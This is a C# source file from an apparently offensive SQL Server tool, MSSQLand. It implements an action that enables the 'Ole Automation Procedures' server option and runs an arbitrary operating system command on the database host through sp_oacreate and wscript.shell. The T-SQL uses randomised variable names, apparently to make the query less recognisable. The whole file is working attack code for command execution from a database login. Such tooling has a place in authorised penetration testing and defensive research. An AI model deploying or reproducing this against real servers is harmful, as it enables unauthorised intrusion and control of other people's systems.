using MSSQLand.Services;
using MSSQLand.Utilities;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MSSQLand.Actions.Execution
{
    /// <summary>
    /// OLE (Object Linking and Embedding) is a Microsoft technology that allows embedding and linking to documents and objects. In the context of SQL Server, OLE Automation Procedures enable interaction with COM objects from within SQL Server. These objects can perform tasks outside the database, such as file manipulation, network operations, or other system-level activities.
    /// </summary>
    internal class ObjectLinkingEmbedding : BaseAction
    {
        private string _command;

        /// <summary>
        /// Validates the provided command argument.
        /// </summary>
        /// <param name="additionalArguments">The command to be executed.</param>
        public override void ValidateArguments(string additionalArguments)
        {
            if (string.IsNullOrEmpty(additionalArguments))
            {
                throw new ArgumentException("A command must be provided for OLE execution. Usage: <command>");
            }

            _command = additionalArguments;
        }

        public override void Execute(DatabaseContext connectionManager)
        {
            Logger.TaskNested($"Executing OLE command: {_command}");

            // Enable 'Ole Automation Procedures'
            connectionManager.ConfigService.SetConfigurationOption("Ole Automation Procedures", 1);

            // Generate two random string of 3 to 12 chars
            string output = Guid.NewGuid().ToString("N").Substring(0, 6);
            string program = Guid.NewGuid().ToString("N").Substring(0, 6);

            string query = $"DECLARE @{output} INT; DECLARE @{program} VARCHAR(255);SET @{program} = 'Run(\"{_command}\")';EXEC sp_oacreate 'wscript.shell', @{output} out;EXEC sp_oamethod @{output}, @{program};EXEC sp_oadestroy @{output};";

            connectionManager.QueryService.ExecuteNonProcessing(query);
            Logger.Success("Executed command");

        }
    }
}
